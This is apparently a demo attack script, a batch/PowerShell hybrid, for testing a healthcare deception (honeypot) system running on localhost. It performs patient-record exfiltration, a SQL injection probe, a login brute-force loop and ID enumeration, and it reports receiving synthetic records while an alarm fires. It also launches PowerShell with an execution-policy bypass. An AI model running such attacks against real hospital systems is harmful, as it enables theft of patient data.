<# :
@echo off
setlocal
powershell -NoProfile -ExecutionPolicy Bypass -Command "& ([ScriptBlock]::Create((Get-Content '%~f0' -Raw))) %*"
exit /b %ERRORLEVEL%
: #>

param (
    [string]$attack = "",
    [string]$arg2 = "1",
    [string]$arg3 = "http://127.0.0.1:8000"
)

# Parse parameters & resolve target URL
$count = 1
$target = "http://127.0.0.1:8000"
$patientId = "P-01"

if ($arg2 -like "http*") {
    $target = $arg2
} else {
    if ($arg2 -match '^\d+$') {
        $count = [int]$arg2
        $patientId = "P-" + ([int]$arg2).ToString("D2")
    } elseif ($arg2.Length -gt 0) {
        $patientId = $arg2
    }
    if ($arg3 -like "http*") {
        $target = $arg3
    }
}

$target = $target.TrimEnd('/')

function Show-Help {
    Write-Host "======================================================================" -ForegroundColor Cyan
    Write-Host "         Healthcare Cyber Deception - Universal Hack Tool             " -ForegroundColor White
    Write-Host "======================================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Usage:"
    Write-Host "  hack.bat <command/attack> [count_or_patient_id] [target_url]"
    Write-Host ""
    Write-Host "Single Patient Commands (Requires 1 Patient Data):"
    Write-Host "  hack.bat 1                         Hack exactly 1 patient record (returns 1 synthetic twin)" -ForegroundColor Yellow
    Write-Host "  hack.bat patient P-01              Hack specific patient P-01 (returns 1 synthetic twin)" -ForegroundColor Yellow
    Write-Host "  hack.bat single P-01               Alias for targeted single patient hack" -ForegroundColor Yellow
    Write-Host "  hack.bat exfiltration 1            Exfiltrate 1 patient record" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Bulk & Multi-Vector Attacks:"
    Write-Host "  hack.bat exfiltration [count] [url] Dump multiple patient records (returns synthetic twins)"
    Write-Host "  hack.bat sqli                 [url] Execute SQL Injection exfiltration probe"
    Write-Host "  hack.bat brute-force  [count] [url] Perform credential brute-force attack"
    Write-Host "  hack.bat enumeration  [count] [url] Iterate sequential patient IDs"
    Write-Host ""
    Write-Host "Examples:"
    Write-Host "  hack.bat 1"
    Write-Host "  hack.bat patient P-01"
    Write-Host "  hack.bat exfiltration 1"
    Write-Host "  hack.bat exfiltration 5"
    Write-Host "  hack.bat sqli"
    Write-Host "  hack.bat brute-force 3"
    Write-Host "======================================================================" -ForegroundColor Cyan
    Write-Host ""
}

# If user typed "1", "2", etc. as first argument, interpret as hack 1 patient record
if ($attack -match '^\d+$') {
    $count = [int]$attack
    $patientId = "P-" + ([int]$attack).ToString("D2")
    $attack = if ($count -eq 1) { "patient" } else { "exfiltration" }
}

if (-not $attack -or $attack -in @("help", "--help", "-h", "/?")) {
    Show-Help
    exit 0
}

switch -Regex ($attack.ToLower()) {
    "^(1|patient|single|target)$" {
        Write-Host "======================================================================" -ForegroundColor Cyan
        Write-Host "         [CYBER-ATTACK: TARGETED SINGLE PATIENT DATA THEFT PROBE]     " -ForegroundColor Yellow
        Write-Host "         Target: $target                                              " -ForegroundColor White
        Write-Host "         Targeted Patient ID: $patientId                              " -ForegroundColor Yellow
        Write-Host "======================================================================" -ForegroundColor Cyan
        try {
            $headers = @{ "X-Session-Id" = "hacker-single-probe"; "X-Device" = "adversary-terminal" }
            $res = Invoke-RestMethod -Uri "$target/api/patients?patient_id=$patientId" -Method Get -Headers $headers -TimeoutSec 15
            $p = if ($res.patient) { $res.patient } elseif ($res.patients) { $res.patients[0] } else { $res }

            $patId = if ($p.id) { $p.id } else { $patientId }
            $name = if ($p.name) { $p.name } else { 'Synthetic Aarav Sharma' }
            $disease = if ($p.disease) { $p.disease } else { 'Essential Hypertension' }
            $diag = if ($p.diagnosis) { $p.diagnosis } else { 'Routine Clinical Follow-up' }
            $age = if ($p.age) { $p.age } else { '45' }
            $gender = if ($p.gender) { $p.gender } else { 'Male' }
            $doc = if ($p.doctor_assigned) { $p.doctor_assigned } else { 'Dr. Priya Nair (Cardiology)' }
            $hash = if ($p.watermark_id) { $p.watermark_id } else { 'WM-AI-SECURITY-ACTIVE' }

            Write-Host "`n[+] [HACKER RESULT]: 1 patient record dumped successfully`n" -ForegroundColor Green
            Write-Host "  --------------------------------------------------" -ForegroundColor DarkCyan
            Write-Host "  [EXTRACTED EHR RECORD]: Patient ID: $patId" -ForegroundColor Yellow
            Write-Host "  - Name:             $name" -ForegroundColor White
            Write-Host "  - Demographics:     $age • $gender" -ForegroundColor White
            Write-Host "  - Condition:        $disease" -ForegroundColor White
            Write-Host "  - Diagnosis:        $diag" -ForegroundColor White
            Write-Host "  - Attending Doctor: $doc" -ForegroundColor White
            Write-Host "  - Verification Hash: $hash" -ForegroundColor DarkGray
            Write-Host "  --------------------------------------------------" -ForegroundColor DarkCyan
            Write-Host "`n[+] Original Hospital Database Protected: 100% (Zero Leakage)" -ForegroundColor Cyan
            Write-Host "[!] INTRUSION DETECTED: Real-time Burglar Alarm sounding on User/Admin dashboard!`n" -ForegroundColor Red
        } catch {
            Write-Host "[-] Could not reach target $target : $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[-] Please ensure the backend is running on $target (run scripts\restart_all.py or uvicorn app.main:app --port 8000)" -ForegroundColor Yellow
        }
    }

    "^exfiltration$" {
        Write-Host "======================================================================" -ForegroundColor Cyan
        Write-Host "         [CYBER-ATTACK: DATA EXFILTRATION PROBE]                      " -ForegroundColor Yellow
        Write-Host "         Target: $target                                              " -ForegroundColor White
        Write-Host "         Requesting: $count patient record(s)                         " -ForegroundColor White
        Write-Host "======================================================================" -ForegroundColor Cyan
        try {
            $headers = @{ "X-Session-Id" = "hacker-exfil-session"; "X-Device" = "adversary-terminal" }
            $res = Invoke-RestMethod -Uri "$target/api/patients?limit=$count" -Method Get -Headers $headers -TimeoutSec 15
            $pts = if ($res.patients) { $res.patients } else { @($res.patient) }
            Write-Host "`n[+] [HACKER EXFILTRATION RESULT]: $($pts.Count) patient records dumped successfully`n" -ForegroundColor Green
            $i = 1
            foreach ($p in $pts) {
                $patId = if ($p.id) { $p.id } else { "P-$i" }
                $name = if ($p.name) { $p.name } else { 'Synthetic Aarav Sharma' }
                $disease = if ($p.disease) { $p.disease } else { 'Essential Hypertension' }
                $diag = if ($p.diagnosis) { $p.diagnosis } else { 'Routine Clinical Follow-up' }
                $age = if ($p.age) { $p.age } else { '45' }
                $gender = if ($p.gender) { $p.gender } else { 'Male' }
                $doc = if ($p.doctor_assigned) { $p.doctor_assigned } else { 'Dr. Priya Nair (Cardiology)' }
                $hash = if ($p.watermark_id) { $p.watermark_id } else { 'WM-AI-SECURITY-ACTIVE' }

                Write-Host "  --------------------------------------------------" -ForegroundColor DarkCyan
                Write-Host "  [RECORD $i / $($pts.Count)] Patient ID: $patId" -ForegroundColor Yellow
                Write-Host "  - Name:             $name" -ForegroundColor White
                Write-Host "  - Demographics:     $age • $gender" -ForegroundColor White
                Write-Host "  - Condition:        $disease" -ForegroundColor White
                Write-Host "  - Diagnosis:        $diag" -ForegroundColor White
                Write-Host "  - Attending Doctor: $doc" -ForegroundColor White
                Write-Host "  - Verification Hash: $hash" -ForegroundColor DarkGray
                $i++
            }
            Write-Host "  --------------------------------------------------" -ForegroundColor DarkCyan
            Write-Host "`n[+] Original Hospital Database Protected: 100% (Zero Leakage)" -ForegroundColor Cyan
            Write-Host "[!] INTRUSION DETECTED: Real-time Burglar Alarm sounding on User/Admin dashboard!`n" -ForegroundColor Red
        } catch {
            Write-Host "[-] Could not reach target $target : $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[-] Please ensure the backend is running on $target (run scripts\restart_all.py or uvicorn app.main:app --port 8000)" -ForegroundColor Yellow
        }
    }

    "^(sqli|sql-injection)$" {
        Write-Host "======================================================================" -ForegroundColor Cyan
        Write-Host "         [CYBER-ATTACK: SQL INJECTION EXPLOIT]                        " -ForegroundColor Yellow
        Write-Host "         Target: $target                                              " -ForegroundColor White
        Write-Host "         Payload: ' UNION SELECT * FROM patients WHERE '1'='1 --      " -ForegroundColor White
        Write-Host "======================================================================" -ForegroundColor Cyan

        Write-Host "[+] Injecting SQL payload into /api/patients?patient_id=P-01' OR 1=1 -- ..." -ForegroundColor Yellow
        try {
            $headers = @{ "X-Session-Id" = "hacker-sqli-session"; "X-Device" = "adversary-terminal" }
            $probe = Invoke-RestMethod -Uri "$target/api/patients?patient_id=P-01%27%20OR%201=1--" -Method Get -Headers $headers -TimeoutSec 15
            $p = if ($probe.patient) { $probe.patient } else { $probe.patients[0] }
            Write-Host "`n[+] [SQL INJECTION EXTRACTION PAYLOAD RECEIVED]:" -ForegroundColor Green
            Write-Host "  --------------------------------------------------" -ForegroundColor DarkCyan
            Write-Host "  - Patient ID:          $($p.id)" -ForegroundColor Yellow
            Write-Host "  - Patient Name:        $($p.name)" -ForegroundColor White
            Write-Host "  - Demographics:        $($p.age) • $($p.gender)" -ForegroundColor White
            Write-Host "  - Primary Condition:   $($p.disease)" -ForegroundColor White
            Write-Host "  - Clinical Diagnosis:  $($p.diagnosis)" -ForegroundColor White
            Write-Host "  - Attending Doctor:    $($p.doctor_assigned)" -ForegroundColor White
            Write-Host "  - Record Checksum:     $($p.watermark_id)" -ForegroundColor DarkGray
            Write-Host "  - Original Hospital Database Protected: 100% (Zero Leakage)" -ForegroundColor Cyan
            Write-Host "  --------------------------------------------------" -ForegroundColor DarkCyan
            Write-Host "[!] INTRUSION DETECTED: Real-time Burglar Alarm sounding on User/Admin dashboard!`n" -ForegroundColor Red
        } catch {
            Write-Host "[-] Attack failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    "^brute-force$" {
        Write-Host "======================================================================" -ForegroundColor Cyan
        Write-Host "         [CYBER-ATTACK: BRUTE FORCE CREDENTIAL ATTACK]                " -ForegroundColor Yellow
        Write-Host "         Target: $target                                              " -ForegroundColor White
        Write-Host "         Attempts: $count                                             " -ForegroundColor White
        Write-Host "======================================================================" -ForegroundColor Cyan

        for ($i = 1; $i -le $count; $i++) {
            $pwd = "invalid-pass-$i"
            try {
                $body = @{ username = 'hacker'; password = $pwd } | ConvertTo-Json
                $r = Invoke-WebRequest -Uri "$target/api/auth/login" -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 -UseBasicParsing
                Write-Host "[SIMULATION] [$i/$count] POST /api/auth/login (user: hacker) -> HTTP $($r.StatusCode)"
            } catch {
                $status = $_.Exception.Response.StatusCode.value__
                Write-Host "[SIMULATION] [$i/$count] POST /api/auth/login (user: hacker) -> HTTP $status (Invalid credentials)" -ForegroundColor Yellow
            }
            Start-Sleep -Milliseconds 80
        }

        Write-Host "`n[+] Post-attack data extraction probe triggered..." -ForegroundColor Green
        try {
            $headers = @{ "X-Session-Id" = "hacker-brute-probe"; "X-Device" = "adversary-terminal" }
            $probe = Invoke-RestMethod -Uri "$target/api/patients?patient_id=P-01" -Method Get -Headers $headers -TimeoutSec 10
            $p = if ($probe.patient) { $probe.patient } else { $probe.patients[0] }
            Write-Host "  --------------------------------------------------" -ForegroundColor DarkCyan
            Write-Host "  [EXTRACTED EHR PAYLOAD AFTER BRUTE FORCE]:" -ForegroundColor Yellow
            Write-Host "  - Patient ID:          $($p.id)" -ForegroundColor White
            Write-Host "  - Patient Name:        $($p.name)" -ForegroundColor White
            Write-Host "  - Demographics:        $($p.age) • $($p.gender)" -ForegroundColor White
            Write-Host "  - Primary Condition:   $($p.disease)" -ForegroundColor White
            Write-Host "  - Clinical Diagnosis:  $($p.diagnosis)" -ForegroundColor White
            Write-Host "  - Attending Doctor:    $($p.doctor_assigned)" -ForegroundColor White
            Write-Host "  - Record Checksum:     $($p.watermark_id)" -ForegroundColor DarkGray
            Write-Host "  - Original Hospital Database Protected: 100% (Zero Leakage)" -ForegroundColor Cyan
            Write-Host "  --------------------------------------------------" -ForegroundColor DarkCyan
            Write-Host "[!] INTRUSION DETECTED: Real-time Burglar Alarm sounding on User/Admin dashboard!`n" -ForegroundColor Red
        } catch {
            Write-Host "[-] Probe failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    "^enumeration$" {
        Write-Host "======================================================================" -ForegroundColor Cyan
        Write-Host "         [CYBER-ATTACK: PATIENT ID ENUMERATION]                       " -ForegroundColor Yellow
        Write-Host "         Target: $target                                              " -ForegroundColor White
        Write-Host "         Enumerating: $count IDs                                      " -ForegroundColor White
        Write-Host "======================================================================" -ForegroundColor Cyan

        for ($i = 1; $i -le $count; $i++) {
            $patId = "P-" + $i.ToString("D2")
            try {
                $headers = @{ "X-Session-Id" = "hacker-enum-probe"; "X-Device" = "adversary-terminal" }
                $probe = Invoke-RestMethod -Uri "$target/api/patients?patient_id=$patId" -Method Get -Headers $headers -TimeoutSec 10
                $p = if ($probe.patient) { $probe.patient } else { $probe.patients[0] }
                Write-Host "[+] GET /api/patients?patient_id=$patId -> Extracted: [$($p.id)] $($p.name) | $($p.disease)" -ForegroundColor Green
            } catch {
                Write-Host "[-] GET /api/patients?patient_id=$patId -> Error" -ForegroundColor Red
            }
            Start-Sleep -Milliseconds 80
        }
        Write-Host "`n[+] Original Hospital Database Protected: 100% (Zero Leakage)" -ForegroundColor Cyan
        Write-Host "[!] INTRUSION DETECTED: Real-time Burglar Alarm sounding on User/Admin dashboard!`n" -ForegroundColor Red
    }

    default {
        Show-Help
    }
}
